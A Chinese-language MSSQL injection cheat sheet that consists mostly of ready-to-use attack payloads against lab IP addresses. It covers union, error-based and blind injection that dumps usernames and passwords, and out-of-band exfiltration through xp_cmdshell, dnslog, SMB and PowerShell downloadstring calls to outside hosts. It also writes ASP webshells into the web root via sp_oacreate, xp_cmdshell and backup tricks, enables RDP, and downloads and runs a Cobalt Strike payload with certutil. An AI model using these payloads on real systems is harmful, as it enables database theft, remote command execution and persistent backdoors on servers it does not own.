# mssql

## 联合查询注入流程

1. 判断是否存在注入

   ```sql
   ?id=1' and 123=123--
   ?id=1' and 123=12--
   ?id=1' and exists(select * from sysobjects) -- #判断是否为mssql数据库
   ```

2. 判断字段数

   ```
   ?id=1' order by 3--
   ```

3. 判断回显

   ```
   ?id=-1' union select 1,2,3--
   ```

4. 查询数据库信息

   相关变量和函数

   ```
   @@version  #获取数据库版本
   user  #获取当前数据库用户名
   host_name()  #获取当前连接数据库的用户名
   @@servername  #获取数据库的主机名
   db_name()  #获取当前数据库名,db_name(N)可用于遍历其他数据库
   ;select user  #验证是否支持多语句堆叠注入
   ```

   相关payload

   ```
   ?id=-1' union select 1,db_name(),@@version--
   ?id=-1' union select 1,host_name(),@@servername--
   ?id=-1' union select 1,user,3--
   ?id=-1' union select 1,(select top 1 name from sys.databases where name not in(select top 6 name from sys.databases)),3-- #查询第7行的数据
   ?id=-1' union select 1,db_name(1),3-- #查询第一个数据库名
   ```

   ```
   ?id=-1' union select 1,(select top 1 name from sysobjects where xtype = 'U' and name not in(select top 0 name from sysobjects where xtype='U')),3--
   ?id=-1' union select 1,(select top 1 name from syscolumns where id=(SELECT top 1 id FROM sysobjects where name='users' and id not in(select top 0 id from sysobjects where xtype='U')) and name not in(select top 2 name from syscolumns where id=(SELECT top 1 id FROM sysobjects where name='users' and id not in(select top 0 id from sysobjects where xtype='U')))),3--
   ```

5. 查询数据库中表信息

   ```
   ?id=-1' union select 1,(select top 1 table_name from test.information_schema.tables where table_name not in(select top 0 table_name from test.information_schema.tables)),3-- #查询test数据库中所有表信息
   ```

6. 查询数据库中列信息

   ```
   ?id=-1' union select 1,(select top 1 column_name from test.information_schema.columns where table_name='users' and column_name not in(select top 0 column_name from test.information_schema.columns where table_name='users')),3-- #查询test数据库中users表的列信息
   ```

7. 查询数据内容信息

   ```
   ?id=-1' union select 1,(select top 1 username from users where username not in(select top 0 username from users)),(select top 1 password from users where password not in(select top 0 password from users))-- #通过两个回显点同时查看用户名和密码
   ```

## 报错注入

报错注入通常使用类型转换报错来使数据显示出来

1. 类型转换报错获取数据库信息

   ```
   ?id=-1' and 1=db_name()--
   ?id=-1' and (select name from sys.databases where database_id=1)>0--
   ?id=1' and (select name,':' from sys.databases for xml path)>0--  #全显示
   ?id=1' and (select quotename(name) from sys.databases for xml path)>0--  #全显示（quotename函数能够为返回信息加上[]，便于观察）
   ?id=1' and (select top 1 cast(name as int) from sys.databases where name not in(select top 0 name from sys.databases))>0--
   ?id=1' and (select top 1 convert(int,name) from sys.databases where name not in(select top 0 name from sys.databases))>0--
   ```

2. 类型转换报错获取表信息

   ```
   ?id=1' and (select quotename(table_name) from test.information_schema.tables for xml path)>0--  #爆出全部
   ?id=1' and (select top 1 cast(table_name as int) from test.information_schema.tables where table_name not in(select top 0 table_name from test.information_schema.tables))>0--
   ?id=1' and (select top 1 convert(int,table_name) from test.information_schema.tables where table_name not in(select top 0 table_name from test.information_schema.tables))>0--
   ```

3. 类型转换报错获取列信息

   ```
   ?id=1' and (select quotename(column_name) from test.information_schema.columns where table_name='users' for xml path)>0-- #爆出全部
   ?id=1' and (select top 1 cast(column_name as int) from test.information_schema.columns where table_name='users' and column_name not in(select top 1 column_name from test.information_schema.columns where table_name='users'))>0--
   ?id=1' and (select top 1 convert(int,column_name) from test.information_schema.columns where table_name='users' and column_name not in(select top 1 column_name from test.information_schema.columns where table_name='users'))>0--
   ```

4. 脱库

   ```
   ?id=1' and (select quotename(username),':',quotename(password) from users for xml path)>0--
   ```

## 布尔盲注

```
?id=1' and substring((select top 1 name from sys.databases where name not in(select top 0 name from sys.databases)),1,1)='m'--
?id=1' and ascii(substring((select top 1 name from sys.databases where name not in(select top 0 name from sys.databases)),1,1))=109--
```

## 时间盲注

```
id=1' if(substring((select top 1 name from sys.databases where name not in(select top 0 name from sys.databases)),1,1)='m') waitfor delay '0:0:5'--
?id=1' if(ascii(substring((select top 1 name from sys.databases where name not in(select top 0 name from sys.databases)),1,1))=109) waitfor delay '0:0:5'--
```

## 数据外带

### DNS数据外带

当注入点仅存在盲注时，使用sqlmap出数据太慢，使用数据外带加速出数据

> 数据外带条件：网站存在对鞋注入

1. 利用xp_cmdshell扩展存储过程 指定ping dnslog命令带出数据
2. 利用xp_subdirs，xp_dirtree，xp_fileexist 使用unc路径判断文件发起请求带出数据
3. `declare @a varchar(8000);`#声明一个变量a，字符类型为varchar(8000)
4. `set @a=db_name();`#指定变量绑定一个mmsql函数
5. `exec('master..xp_cmdshell "ping.exe ' +@a+ '.gddxi9.dnslog.cn -n 1"')--` #引用变量拼接到xp_cmdshell执行语句中带出数据
6. exec('master..xp_cmdshell "ping.exe ' %2b@a%2b '.gddxi9.dnslog.cn -n 1"')--

```
?id=1';declare %40a varchar(8000);set %40a=db_name();exec('master..xp_cmdshell "ping.exe '%2b@a%2b'.uos3zg.dnslog.cn -n 1"')-- #堆叠注入使用扩展存储过程进行数据外带
?id=1';declare @a varchar(1024);set @a=db_name();exec('master..xp_subdirs "//'%2B@a%2B'.3n8hen.dnslog.cn\\a"')--
?id=1';declare @a varchar(1024);set @a=db_name();exec('master..xp_fileexist "//'%2B@a%2B'.7wb9ur.dnslog.cn\\a" ')-- 
?id=1';declare @a varchar(1024);set @a=(select top 1 name from sys.databases);exec('master..xp_fileexist "//'%2B@a%2B'.e0cwlo.dnslog.cn\\a" ')-- #堆叠注入使用扩展存储过程进行数据外带
```

### HTTP数据外带

利用xp_cmdshell 执行powershell命令发起http请求

```
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(8000);SET @a=db_name();exec('master..xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''http://192.168.172.1:8888?data='%2b @a %2b''')"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(8000);SET @a=(select top 1 name from sys.databases);exec('master..xp_cmdshell "powershell IEX (new-object net.webclient).downloadstring(''http://192.168.172.1:8888?data='%2b @a %2b''')"')--
```

### SMB数据外带

利用xp_subdirs,xp_dirtree,xp_fileexist使用unc路径判断文件发起请求带出数据

```
tail -f /var/log/samba/log.smbd | grep "failed"
```

```
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=db_name();exec('master..xp_subdirs "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select top 1 name from sys.databases);exec('master..xp_subdirs "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select user);exec('master..xp_subdirs "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select user);exec('master..xp_fileexist "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select top 1 name from sys.databases where database_id=7);exec('master..xp_fileexist "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select top 1 name from sys.databases where database_id=1);exec('master..xp_dirtree "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
http://192.168.172.140/less-1.asp?id=1';declare @a varchar(1024);set @a=(select user);exec('master..xp_fileexist "//'%2B'192.168.172.130\\'%2b@a%2b'.txt"')--
```

### 不存在堆叠注入时使用数据外带

dnslog

```
http://192.168.172.140/less-1.asp?id=1' and exists(select * from fn_xe_file_target_read_file('C:*.xls','\\'+(select user)+'.7wb9ur.dnslog.cn\1.txt',null,null))--
http://192.168.172.140/less-1.asp?id=1' and exists(select * from fn_get_audit_file('\\'%2b(select db_name())%2b'.gge9i3.dnslog.cn\123.txt',default,default))--
http://192.168.172.140/less-1.asp?id=1' and exists(select * from fn_trace_gettable('\\'%2b(select db_name())%2b'.g9f6y2.dnslog.cn\1.txt',default))--
```

smb

```
http://192.168.172.140/less-1.asp?id=1' and exists(select * from fn_get_audit_file('\\192.168.172.130\'%2b(select db_name())%2b'.txt',default,default))--
```

## 存储过程

### 判断服务器角色

```
and 1=(select IS_SRVROLEMEMBER('sysadmin'))
and 1=(select IS_SRVROLEMEMBER('serveradmin')) 
and 1=(select IS_SRVROLEMEMBER('setupadmin'))
and 1=(select IS_SRVROLEMEMBER('securityadmin'))
and 1=(select IS_SRVROLEMEMBER('diskadmin'))
and 1=(select IS_SRVROLEMEMBER('bulkadmin'))
```

> 页面回显正常即为该角色

### 系统存储过程

以sp_开头，进行系统的设定。如：sp_oacreate、sp_oamethod

- sp_oacreate是创建 OLE 对象的实例
- sp_oamethod是调用一个 OLE 对象的方法

```
EXEC sp_configure 'show advanced options', 1;   
RECONFIGURE WITH OVERRIDE;   
EXEC sp_configure 'Ole Automation Procedures', 1;   
RECONFIGURE WITH OVERRIDE;
```

命令执行

```
declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami > c:\\1.txt'
#利用mssql定义变量 shell调用wscript.shell利用cmd.exe /c 执行命令并写入文件
#sp_oacreate存储过程执行命令无回显，若存在web环境可写入到web目录
```

利用系统存储过程写shell

```
declare @o int, @f int, @t int, @ret int
exec sp_oacreate 'scripting.filesystemobject', @o out
exec sp_oamethod @o, 'createtextfile', @f out, 'c:\inetpub\wwwroot\shell.asp', 1
exec @ret = sp_oamethod @f, 'writeline', NULL,'<%execute(request("cmd"))%>'
```

利用com组件执行命令

```
declare @luan int,@exec int,@text int,@str varchar(8000);
exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;
exec sp_oamethod @luan,'exec',@exec output,'C:\windows\system32\cmd.exe /c whoami';
exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'readall', @str out;
select @str;
```

SharpSQLTools利用sp_oacreate执行系统命令

```
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master enable_ole
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master sp_oacreate whoami
```

### 本地存储过程

本地存储过程指用户创建的自定义存储过程。sql server集成了CLR组件，可以通过sql server编写CLR来执行系统命令

SharpSQLTools利用CLR执行系统命令

```
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master install_clr  #安装组件
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master enable_clr  #开启组件
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master clr_efspotato whoami  #利用组件执行系统命令
```

### 扩展存储过程

扩展存储过程主要使用外部程序语言编写的存储过程。如：xp_cmdshell直接利用其执行命令

利用xp_cmdshell执行系统命令

```
EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;   #启用xp_cmdshell
exec master..xp_cmdshell 'whoami'
```

利用xp_cmdshell写webshell到根目录

```
exec master..xp_cmdshell 'where /r c:\ *.asp'  #通过asp文件查询web根目录路径
exec master..xp_cmdshell 'echo ^<%eval request("cmd")%^> > c:\inetpub\wwwroot\shell.asp'
```

> windows系统中，^号为转义符号

- PS：获取网站根目录方式

  ```
  无回显
  ##在数据库tempdb下创建临时表temp_db,字段test
  ;use tempdb;create table temp_db (test varchar(1000)); --
  
  ##查找网站文件并把结果写入到test表中
  ;use tempdb;insert into temp_db(test) exec master..xp_cmdshell 'dir /s /b C:\search.asp';--
  
  ##用sqlmap得到表test的内容:
  python2 sqlmap.py -r 1.txt --dbms="Microsoft SQL Server" --technique=E  -D "tempdb" -T "temp_db" -C "test" --dump
  
  ##手工读取temp_db表内容
  and 1=(select top 1 * from tempdb..temp_db where test=1 FOR XML PATH(''))--
  ```

利用xp_cmdshell开启3389

```
exec xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
```

利用xp_cmdshell执行powershell命令上线CS

```
exec master..xp_cmdshell 'certutil.exe -f -split -urlcache http://192.168.172.129:9090/payload64.txt c:\\inetpub\\wwwroot\\payload1.bat'
exec master..xp_cmdshell 'c:\\inetpub\\wwwroot\\payload1.bat'
```

SharpSQLTools利用xp_cmdshell

```
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master enable_xp_cmdshell
SharpSQLTools.exe 192.168.172.140 sa ICQsafe666 master xp_cmdshell whoami
```

PS：若xp_cmdshell被删除，则需要重新恢复或上传xplog70.dll进行恢复，恢复语句如下

```
Exec master.dbo.sp_addextendedproc 'xp_cmdshell','xplog70.dll路径'
exec sp_addextendedproc xp_cmdshell,@dllname='xplog70.dll'
EXEC sp_addextendedproc xp_cmdshell ,@dllname ='xplog70.dll'
EXEC sp_addextendedproc xp_enumgroups ,@dllname ='xplog70.dll'
EXEC sp_addextendedproc xp_loginconfig ,@dllname ='xplog70.dll'
EXEC sp_addextendedproc xp_enumerrorlogs ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_getfiledetails ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc Sp_OACreate ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OADestroy ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OAGetErrorInfo ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OAGetProperty ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OAMethod ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OASetProperty ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc Sp_OAStop ,@dllname ='odsole70.dll'
EXEC sp_addextendedproc xp_regaddmultistring ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regdeletekey ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regdeletevalue ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regenumvalues ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regremovemultistring ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regwrite ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_dirtree ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_regread ,@dllname ='xpstar.dll'
EXEC sp_addextendedproc xp_fixeddrives ,@dllname ='xpstar.dll'
```

```
Select count(*) from master.dbo.sysobjects where xtype='X' and name='xp_cmdshell'  #返回1则说明扩展存储存在
```

#### 其他可利用扩展存储

- xp_subdirs  用于得到给定的文件夹内的文件夹列表

  ```
  exec master..xp_subdirs 'c:\'
  ```

- xp_dirtree  用于显示当前目录的子目录,该存储过程有三个参数

  - directory：第一个参数是要查询的目录
  - depth ：第二个参数是要显示的子目录的深度（默认值为0，表示显示所有的子目录）
  - file ：第三个参数是bool类型，指定是否显示子目录中的文件（默认值为0，表示不显示任何文件，只显示子目录）

  ```
  exec master..xp_dirtree 'c:\'    #递归显示c盘所有文件和目录
  exec master..xp_dirtree 'c:\',1  #显示c盘所有目录
  exec master..xp_dirtree 'c:\inetpub\',1,1  #显示指定目录下的目录和文件
  ```

- xp_create_subdir 用于创建子目录

  ```
  exec master..xp_create_subdir 'c:\test'  #c盘下创建一个test目录
  ```

- xp_fileexist 用于判断文件是否存在，该存储过程返回的结果集有一行数据，三个字段

  ```
  exec master..xp_fileexist 'c:\windows\win.ini'
  ```


## log备份写shell

利用条件：

- 至少DBO权限，默认SA满足
- 前提得知绝对路径，并且可写
- 站库不分离，数据库跟网站在同一台服务器
- 数据库必须被备份过一次

```
use test;
alter database test set recovery full; # 修改test数据库恢复模式为完整模式
IF EXISTS(select table_name from information_schema.tables where table_name='test_tmp') drop table test_tmp; # 如果存在test_tmp就删除
create table  test_tmp  (a image); # 创建test_tmp表，只有一个列a，类型为image
backup log test to disk ='C:\\inetpub\\wwwroot\\asp.bak' with init; # 备份test数据库到指定路径
insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253E); # 插入一句话木马到test_tmp表中的a
backup log test to disk = 'C:\\inetpub\\wwwroot\\123.asp'; # 备份操作日志到指定文件
drop table test_tmp # 删除test_tmp表
```

```
#组合堆叠注入进行利用url
http://192.168.172.140/less-1.asp?id=1';alter database test set recovery full;IF EXISTS(select table_name from information_schema.tables where table_name='test_tmp') drop table test_tmp;create table test_tmp (a image);backup log test to disk ='C:\\inetpub\\wwwroot\\mssqli\\asp.bak' with init;insert into test_tmp (a) values (0x3C25657865637574652872657175657374282261222929253E);backup log test to disk = 'C:\\inetpub\\wwwroot\\mssqli\\shelllog.asp'--
0x3C25657865637574652872657175657374282261222929253E -><%execute(request("a"))%>
```

> 写不进去可以尝试重放发送payload

## 差异备份写shell

利用条件：

- 至少DBO权限
- 前提知道绝对路径，路径可写。
- HTTP 500错误不是自定义
- WEB和数据库在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。
- 数据量不能太大

```
;backup database test to disk = 'c:\\inetpub\\wwwroot\\mssql.bak' ;--    //先手动备份一次
;create table test..test(a image)--     //建立表，加字段
;insert into test..test(a) values (0x3C25657865637574652872657175657374282261222929253E)--     
//插入一句话木马到表中，注意16进制
;backup database test to disk = 'c:\\inetpub\\wwwroot\\shell.asp' with differential , format ;--    
//进行差异备份
;Drop table test..test--     //备份完getshell过后删除表
组合所有语句
use test;
backup database test to disk = 'c:\\inetpub\\wwwroot\\mssql1.bak';
create table test..test1(a image);
insert into test..test1(a) values (0x3C25657865637574652872657175657374282261222929253E);
backup database test to disk = 'c:\\inetpub\\wwwroot\\shell1.asp' with differential,format;
Drop table test..test1;
http://192.168.172.140/less-1.asp?id=1';use test;backup database test to disk = 'c:\\inetpub\\wwwroot\\mssql1.bak';create table test..test1(a image);insert into test..test1(a) values (0x3C25657865637574652872657175657374282261222929253E);backup database test to disk = 'c:\\inetpub\\wwwroot\\shell1.asp' with differential,format;Drop table test..test1;--
```

## sqlmap -os-shell|--os-cmd对于mysql和mssql有什么区别

mysq环境下：

- 利用联合查询或堆叠查询写文件（into outfile|dumpfile)
- 利用已知的web绝对路径，写入文件上传页面
- 利用文件上传页面上传 命令执行小马
- 利用命令执行小马 执行系统命令

mssql环境下：

- 探测xp_cmdshell扩展存储过程是否可用（是否被删除，删除则无法利用）
- 如果被禁用则利用堆叠注入执行exec sp_configure开启xp_cmdshell
- 创建sqlmapoutput表，其中有id data字段
- 利用堆叠注入通过declare声明变量并组合xp_cmdshell执行命令，将执行结果存入sqlmapoutput表中的data字段
- 利用时间盲注从sqlmapoutput表的data字段中取出命令执行结果
